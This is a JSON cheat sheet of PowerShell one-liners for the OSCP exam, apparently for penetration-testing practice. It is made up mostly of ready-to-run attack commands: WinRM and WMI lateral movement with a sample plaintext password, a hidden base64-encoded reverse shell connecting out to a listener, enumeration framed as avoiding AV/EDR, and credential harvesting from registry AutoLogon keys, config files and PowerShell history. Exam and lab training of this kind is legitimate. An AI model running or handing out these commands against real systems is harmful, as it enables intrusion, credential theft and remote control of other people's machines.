{
  "cheatsheets": [
    {
      "id": "powershell-one-liners",
      "name": "PowerShell One-Liners for OSCP",
      "description": "Essential PowerShell one-liner commands for rapid lateral movement, enumeration, and exploitation in OSCP exam scenarios. All commands use built-in Windows capabilities without requiring tool uploads.",
      "educational_header": {
        "how_to_recognize": [
          "You have RDP, WinRM, or shell access to Windows domain-joined host",
          "Credentials available for domain user with admin rights on target systems",
          "WinRM (5985/5986) or WMI/RPC (135) ports open on target hosts",
          "Need rapid execution without uploading PowerView, Mimikatz, or other tools"
        ],
        "when_to_look_for": [
          "After obtaining domain user credentials during OSCP exam",
          "When pivoting from compromised workstation to internal servers",
          "Flag retrieval phase after successful privilege escalation",
          "AD enumeration without triggering AV alerts from tool uploads"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: WinRM Lateral Movement with Flag Retrieval",
          "context": "You compromised CLIENT74 as user 'jeff' and obtained credentials for domain admin 'jen' (password: Nexus123!). Target server WEB04 (192.168.117.70) has WinRM enabled. You need to move laterally and retrieve the Administrator desktop flag without establishing interactive session.",
          "approach": "Use Invoke-Command to execute remote PowerShell commands via WinRM. First create PSCredential object with jen's credentials, then use Invoke-Command with -ScriptBlock to read flag file directly from Administrator's desktop. This one-liner approach completes lateral movement and flag retrieval in a single command without requiring persistent session.",
          "commands": [
            "ps-winrm-credential-setup",
            "ps-winrm-invoke-command",
            "ps-search-desktop-flags"
          ],
          "expected_outcome": "Complete one-liner executes in 5-15 seconds, returns flag content directly to your console. No interactive session needed. Success rate: 95% when WinRM enabled and credentials valid. Typical OSCP scenario - saves 2-3 minutes versus interactive session approach.",
          "why_this_works": "WinRM allows remote PowerShell execution for domain users in Administrators or Remote Management Users group. Invoke-Command with -ScriptBlock executes Get-Content on remote host and returns results to local console. PSCredential object bypasses interactive authentication prompts. UAC remote restrictions do not apply to domain users, providing full admin privileges."
        },
        {
          "title": "Scenario 2: WMI Lateral Movement with Reverse Shell",
          "context": "Target FILES04 (192.168.50.73) has WinRM disabled but RPC port 135 open. You have domain user 'jen' credentials. Need to establish reverse shell for interactive access when WinRM unavailable.",
          "approach": "Use WMI/CIM sessions via DCOM protocol as alternative to WinRM. Create CimSession using New-CimSessionOption with -Protocol DCOM, then use Invoke-CimMethod with Win32_Process.Create to spawn reverse shell process. Shell runs in session 0 as SYSTEM, invisible to logged-in users. Pre-generate base64-encoded PowerShell reverse shell using Python encoder script.",
          "commands": [
            "ps-reverse-shell-encoder-python",
            "ps-wmi-cimsession-setup",
            "ps-wmi-invoke-method",
            "ps-reverse-shell-base64"
          ],
          "expected_outcome": "Reverse shell connects to attacker listener within 5-10 seconds. Runs as SYSTEM in session 0 (invisible to users). Success rate: 85% when RPC available and high port range (49152-65535) not blocked by firewall. Critical backup technique when WinRM unavailable - demonstrates protocol diversity for OSCP exam.",
          "why_this_works": "WMI uses RPC over port 135 + dynamic high ports for remote process creation. Win32_Process.Create method spawns processes as SYSTEM service in session 0. DCOM protocol bypasses WinRM requirements. Base64 encoding avoids special character escaping issues in command-line arguments. Reverse shells initiate outbound connection, bypassing inbound firewall rules that might block bind shells."
        },
        {
          "title": "Scenario 3: Active Directory Enumeration Without Tools",
          "context": "You gained access to domain-joined workstation as standard domain user. Need to enumerate AD environment (domain controllers, privileged users, groups) without uploading PowerView or SharpHound which might trigger AV/EDR alerts.",
          "approach": "Use built-in .NET classes accessible via PowerShell: [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() for domain info and [adsisearcher] type accelerator for LDAP queries. These methods use native Windows APIs, require no tool uploads, and have minimal detection footprint. Query for privileged accounts using adminCount=1 LDAP filter to identify high-value targets.",
          "commands": [
            "ps-get-current-domain",
            "ps-ldap-directorysearcher"
          ],
          "expected_outcome": "Domain enumeration completes in 5-30 seconds depending on domain size. Identifies domain controllers, PDC, privileged accounts without any file transfers. Success rate: 99% on domain-joined hosts. Critical for OSCP AD labs when tool uploads blocked or detected. Demonstrates understanding of underlying AD protocols.",
          "why_this_works": "[adsisearcher] is PowerShell type accelerator for System.DirectoryServices.DirectorySearcher which performs LDAP queries against AD. Automatically uses current user's domain credentials and binds to domain context. GetCurrentDomain() leverages System.DirectoryServices.ActiveDirectory namespace for domain topology information. Both methods are built into Windows/.NET Framework - no external dependencies. LDAP filters like (&(objectClass=user)(adminCount=1)) identify protected admin accounts flagged by AdminSDHolder process."
        },
        {
          "title": "Scenario 4: Post-Exploitation Credential Harvesting",
          "context": "You escalated privileges to Administrator on Windows workstation. Before moving laterally, search for additional credentials in registry AutoLogon keys, configuration files, and PowerShell history that might enable access to other systems.",
          "approach": "Execute three quick one-liners: (1) Check registry HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon for AutoLogon cleartext passwords, (2) Search filesystem for unattend.xml and web.config files containing deployment/database credentials, (3) Read PowerShell command history files where users may have typed credentials in plaintext commands.",
          "commands": [
            "ps-registry-autologon",
            "ps-search-credentials"
          ],
          "expected_outcome": "Credential harvesting completes in 30 seconds to 3 minutes. Common finds: AutoLogon credentials (30% of OSCP lab hosts), unattend.xml with local admin passwords (20%), database connection strings in web.config files (40% of web servers). Found credentials often enable lateral movement to additional hosts or provide domain admin access through password reuse.",
          "why_this_works": "Windows AutoLogon feature stores credentials in plaintext registry keys (DefaultUserName/DefaultPassword) for convenience - common misconfiguration in lab environments. Deployment answer files (unattend.xml, sysprep.inf) contain local admin passwords used during Windows installation. Web applications store database credentials in web.config files. PowerShell history (ConsoleHost_history.txt) logs all commands including those with embedded credentials. Credential reuse is pervasive in corporate environments - same passwords used across multiple systems."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: Credential Setup for Remote Authentication",
          "notes": "First step for all WinRM/WMI lateral movement - create reusable PSCredential object from username/password. Required before Invoke-Command, New-PSSession, or New-CimSession. Can be compressed into one-liners with semicolons for speed.",
          "commands": [
            {
              "id": "ps-winrm-credential-setup",
              "example": "$username = 'jen'; $password = 'Nexus123!'; $secureString = ConvertTo-SecureString $password -AsPlaintext -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $secureString",
              "shows": "Command executes successfully"
            }
          ]
        },
        {
          "title": "Phase 2: Lateral Movement via WinRM",
          "notes": "WinRM-based remote execution when port 5985/5986 available. Fastest method for flag retrieval and command execution. Domain users bypass UAC remote restrictions. Invoke-Command for one-off commands, New-PSSession for interactive shells.",
          "commands": [
            {
              "id": "ps-winrm-invoke-command",
              "example": "Invoke-Command -ComputerName 192.168.50.73 -Credential $credential -ScriptBlock {whoami; hostname}",
              "shows": "Command executes successfully"
            }
          ]
        },
        {
          "title": "Phase 3: Lateral Movement via WMI (WinRM Alternative)",
          "notes": "WMI-based remote execution when WinRM unavailable but RPC (135) accessible. Requires DCOM protocol configuration. Processes spawn in session 0 as SYSTEM. Common backup technique when WinRM blocked by firewall or disabled.",
          "commands": [
            {
              "id": "ps-wmi-cimsession-setup",
              "example": "$options = New-CimSessionOption -Protocol DCOM; $session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options",
              "shows": "Command executes successfully"
            },
            {
              "id": "ps-wmi-invoke-method",
              "example": "Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc'}",
              "shows": "Command executes successfully"
            }
          ]
        },
        {
          "title": "Phase 4: Reverse Shell Payloads",
          "notes": "Base64-encoded PowerShell reverse shells for interactive access after lateral movement. Use Python encoder script to generate payloads with custom LHOST/LPORT. Set up nc listener before execution. Shells run hidden (-w hidden flag) and connect outbound to bypass inbound firewall rules.",
          "commands": [
            {
              "id": "ps-reverse-shell-encoder-python",
              "example": "python3 encode.py",
              "shows": "Command executes successfully"
            },
            {
              "id": "ps-reverse-shell-base64",
              "example": "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7AA...",
              "shows": "Command executes successfully"
            }
          ]
        },
        {
          "title": "Phase 5: Active Directory Enumeration (No Tools)",
          "notes": "Built-in .NET methods for AD enumeration without PowerView/SharpHound uploads. [adsisearcher] for LDAP queries, GetCurrentDomain() for topology info. Works on any domain-joined host with standard user privileges. Minimal AV detection footprint.",
          "commands": [
            {
              "id": "ps-get-current-domain",
              "example": "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()",
              "shows": "Command executes successfully"
            },
            {
              "id": "ps-ldap-directorysearcher",
              "example": "([adsisearcher]'(objectClass=user)').FindAll()",
              "shows": "Command executes successfully"
            }
          ]
        },
        {
          "title": "Phase 6: Flag Retrieval and Post-Exploitation",
          "notes": "Final OSCP exam phase - locate and retrieve proof.txt flags from Administrator desktops. Also includes credential harvesting from registry AutoLogon keys and filesystem searches for passwords in config files. Time-critical commands to maximize exam points.",
          "commands": [
            {
              "id": "ps-search-desktop-flags",
              "example": "Get-Content C:\\Users\\Administrator\\Desktop\\*.txt",
              "shows": "proof.txt contents or flag hash"
            },
            {
              "id": "windows-flag-finder-ps",
              "example": "Write-Host \"`n[*] Searching filesystem...\" -ForegroundColor Cyan; $fc=0; Get-ChildItem -Path C:\\ -Recurse -ErrorAction SilentlyContinue -Include *flag*.txt,*proof*.txt,*local*.txt | ForEach-Object { $fc++; Write-Host \"[FILE] $($_.FullName)\" -ForegroundColor Green; Get-Content $_.FullName }; Write-Host \"    Filesystem complete ($fc files found)\" -ForegroundColor DarkGray; Write-Host \"`n[*] Searching registry...\" -ForegroundColor Cyan; $rc=0; $hives=@('HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall','HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall','HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment'); foreach($hive in $hives){ Write-Host \"    Checking: $hive\" -ForegroundColor DarkGray; Get-ChildItem -Path $hive -ErrorAction SilentlyContinue | ForEach-Object { $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue; $props.PSObject.Properties | Where-Object { $_.Value -match 'OS\\{[a-fA-F0-9]{32}\\}|flag|proof' } | ForEach-Object { $rc++; Write-Host \"[REG] $($_.Name): $($_.Value)\" -ForegroundColor Green } } }; Write-Host \"    Registry complete ($rc matches found)\" -ForegroundColor DarkGray; Write-Host \"`n[*] Checking environment variables...\" -ForegroundColor Cyan; $ec=0; Get-ChildItem Env: | Where-Object { $_.Value -match 'OS\\{|flag|proof' } | ForEach-Object { $ec++; Write-Host \"[ENV] $($_.Name)=$($_.Value)\" -ForegroundColor Green }; Write-Host \"    Environment complete ($ec matches found)\" -ForegroundColor DarkGray; Write-Host \"`n[+] Search complete: $fc files, $rc registry, $ec env vars\" -ForegroundColor Yellow",
              "shows": "[FILE] C:\\...\\proof.txt or [REG] OS{hash} or [ENV] FLAG=value"
            },
            {
              "id": "windows-flag-finder-ps-simple",
              "example": "$f=Get-ChildItem -Path C:\\ -Recurse -ErrorAction SilentlyContinue -Include *flag*.txt,*proof*.txt; if($f){$f.FullName}else{Get-ChildItem C:\\ -Recurse -Include *.txt -ErrorAction SilentlyContinue | Select-String -Pattern 'OS\\{[a-fA-F0-9]{32}\\}' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path -Unique}",
              "shows": "C:\\Users\\Administrator\\Desktop\\proof.txt (filesystem only)"
            },
            {
              "id": "windows-flag-finder-cmd",
              "example": "cmd /c \"dir /s /b C:\\*flag*.txt C:\\*proof*.txt 2>nul & if errorlevel 1 findstr /s /i /m OS{ C:\\*.txt 2>nul\"",
              "shows": "C:\\Users\\Administrator\\Desktop\\proof.txt"
            },
            {
              "id": "ps-registry-autologon",
              "example": "Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' | Select-Object DefaultUserName,DefaultPassword,DefaultDomainName",
              "shows": "Command executes successfully"
            },
            {
              "id": "ps-search-credentials",
              "example": "Get-ChildItem -Path C:\\Users -Include *.txt,*.xml,*.ini,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern password",
              "shows": "Command executes successfully"
            },
            {
              "id": "ps-enum-installed-apps",
              "example": "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\",\"HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" -ErrorAction SilentlyContinue | Select-Object DisplayName,DisplayVersion,Publisher | Sort-Object DisplayName | Format-Table -AutoSize",
              "shows": "List of installed applications with versions"
            },
            {
              "id": "ps-enum-processes",
              "example": "Get-Process | Where-Object {$_.Path} | Select-Object ProcessName,Id,Path | Sort-Object Path | Format-Table -AutoSize",
              "shows": "Running processes with executable paths"
            },
            {
              "id": "ps-enum-processes-wmi",
              "example": "Get-WmiObject Win32_Process | Select-Object Name,ProcessId,ExecutablePath,CommandLine | Format-Table -AutoSize -Wrap",
              "shows": "Processes with command line args (may contain creds)"
            },
            {
              "id": "ps-enum-processes-nonstandard",
              "example": "Get-Process | Where-Object {$_.Path -and $_.Path -notlike 'C:\\Windows\\*'} | Select-Object ProcessName,Id,Path | Sort-Object Path | Format-Table -AutoSize",
              "shows": "Non-system processes (third-party software)"
            }
          ]
        }
      ],
      "tags": [
        "POWERSHELL",
        "LATERAL_MOVEMENT",
        "ACTIVE_DIRECTORY",
        "WINRM",
        "WMI",
        "REVERSE_SHELL",
        "ENUMERATION",
        "POST_EXPLOIT",
        "OSCP:HIGH"
      ]
    }
  ]
}